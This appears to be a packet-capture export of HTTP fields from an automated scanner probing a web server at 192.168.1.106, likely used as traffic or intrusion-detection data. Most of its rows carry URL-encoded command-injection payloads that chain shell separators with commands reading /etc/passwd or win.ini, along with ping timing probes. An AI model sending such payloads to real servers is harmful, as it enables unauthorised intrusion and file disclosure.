http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									450						1	http://192.168.1.106/%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									451						1	http://192.168.1.106/%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									453						1	http://192.168.1.106/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									455						1	http://192.168.1.106/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									456						1	http://192.168.1.106/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									457						1	http://192.168.1.106/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									458						1	http://192.168.1.106/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									460						1	http://192.168.1.106/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									462						1	http://192.168.1.106/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60
																											192.168.1.106									449						1	http://192.168.1.106/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a
																											192.168.1.106									417						1	http://192.168.1.106/web/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/
																											192.168.1.106									482						1	http://192.168.1.106/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									487						1	http://192.168.1.106/web%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									489						1	http://192.168.1.106/web%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									490						1	http://192.168.1.106/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									492						1	http://192.168.1.106/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									493						1	http://192.168.1.106/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									494						1	http://192.168.1.106/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									495						1	http://192.168.1.106/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									496						1	http://192.168.1.106/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									498						1	http://192.168.1.106/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60
																											192.168.1.106									499						1	http://192.168.1.106/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									518						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									521						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									486						1	http://192.168.1.106/web/admin%0auploads%0a/should_not_xist_vvvvvvvvvvvvvv		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/should_not_xist_vvvvvvvvvvvvvv
																											192.168.1.106									540						1	http://192.168.1.106/%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-n%206%20localhost
																											192.168.1.106									544						1	http://192.168.1.106/%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-c%206%20localhost
																											192.168.1.106									545						1	http://192.168.1.106/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									546						1	http://192.168.1.106/%26%26%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-n%206%20localhost
																											192.168.1.106									547						1	http://192.168.1.106/%26%26%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-c%206%20localhost
																											192.168.1.106									548						1	http://192.168.1.106/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									549						1	http://192.168.1.106/%7c%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-n%206%20localhost
																											192.168.1.106									550						1	http://192.168.1.106/%7c%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-c%206%20localhost
																											192.168.1.106									552						1	http://192.168.1.106/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									553						1	http://192.168.1.106/%3b%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-n%206%20localhost
																											192.168.1.106									554						1	http://192.168.1.106/%3b%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-c%206%20localhost
																											192.168.1.106									565						1	http://192.168.1.106/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									576						1	http://192.168.1.106/%20%60ping%20-c%206%20localhost%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60ping%20-c%206%20localhost%60
																											192.168.1.106									578						1	http://192.168.1.106/%20run%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20ping%20-n%206%20localhost
																											192.168.1.106									579						1	http://192.168.1.106/web%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-n%206%20localhost
																											192.168.1.106									580						1	http://192.168.1.106/web%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-c%206%20localhost
																											192.168.1.106									581						1	http://192.168.1.106/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									583						1	http://192.168.1.106/web%26%26%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-n%206%20localhost
																											192.168.1.106									584						1	http://192.168.1.106/web%26%26%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-c%206%20localhost
																											192.168.1.106									585						1	http://192.168.1.106/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									586						1	http://192.168.1.106/web%7c%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-n%206%20localhost
																											192.168.1.106									542						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									587						1	http://192.168.1.106/web%7c%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-c%206%20localhost
																											192.168.1.106									589						1	http://192.168.1.106/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									590						1	http://192.168.1.106/web%3b%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20ping%20-n%206%20localhost
																											192.168.1.106									591						1	http://192.168.1.106/web%3b%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20ping%20-c%206%20localhost
																											192.168.1.106									593						1	http://192.168.1.106/web%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									594						1	http://192.168.1.106/web%20%60ping%20-c%206%20localhost%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60ping%20-c%206%20localhost%60
																											192.168.1.106									595						1	http://192.168.1.106/web%20run%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20ping%20-n%206%20localhost
																											192.168.1.106									588						1	http://192.168.1.106/%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									614						1	http://192.168.1.106/%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									615						1	http://192.168.1.106/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									616						1	http://192.168.1.106/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									617						1	http://192.168.1.106/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									618						1	http://192.168.1.106/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									619						1	http://192.168.1.106/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									620						1	http://192.168.1.106/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									621						1	http://192.168.1.106/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																											192.168.1.106									622						1	http://192.168.1.106/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									623						1	http://192.168.1.106/web%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									624						1	http://192.168.1.106/web%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									625						1	http://192.168.1.106/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									626						1	http://192.168.1.106/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									627						1	http://192.168.1.106/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									628						1	http://192.168.1.106/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									629						1	http://192.168.1.106/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									631						1	http://192.168.1.106/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									632						1	http://192.168.1.106/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																											192.168.1.106									633						1	http://192.168.1.106/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									634						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									635						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									652						1	http://192.168.1.106/%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-n%206%20localhost/
																											192.168.1.106									669						1	http://192.168.1.106/%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-c%206%20localhost/
																											192.168.1.106									670						1	http://192.168.1.106/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									671						1	http://192.168.1.106/%26%26%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-n%206%20localhost/
																											192.168.1.106									672						1	http://192.168.1.106/%26%26%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-c%206%20localhost/
																											192.168.1.106									673						1	http://192.168.1.106/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									674						1	http://192.168.1.106/%7c%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-n%206%20localhost/
																											192.168.1.106									675						1	http://192.168.1.106/%7c%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-c%206%20localhost/
																											192.168.1.106									677						1	http://192.168.1.106/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									678						1	http://192.168.1.106/%3b%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-n%206%20localhost/
																											192.168.1.106									679						1	http://192.168.1.106/%3b%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-c%206%20localhost/
																											192.168.1.106									681						1	http://192.168.1.106/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									682						1	http://192.168.1.106/%20%60ping%20-c%206%20localhost%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60ping%20-c%206%20localhost%60/
																											192.168.1.106									683						1	http://192.168.1.106/%20run%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20ping%20-n%206%20localhost/
																											192.168.1.106									684						1	http://192.168.1.106/web%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-n%206%20localhost/
																											192.168.1.106									685						1	http://192.168.1.106/web%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-c%206%20localhost/
																											192.168.1.106									686						1	http://192.168.1.106/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									687						1	http://192.168.1.106/web%26%26%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-n%206%20localhost/
																											192.168.1.106									689						1	http://192.168.1.106/web%26%26%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-c%206%20localhost/
																											192.168.1.106									691						1	http://192.168.1.106/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									692						1	http://192.168.1.106/web%7c%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-n%206%20localhost/
																											192.168.1.106									693						1	http://192.168.1.106/web%7c%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-c%206%20localhost/
																											192.168.1.106									694						1	http://192.168.1.106/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									695						1	http://192.168.1.106/web%3b%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20ping%20-n%206%20localhost/
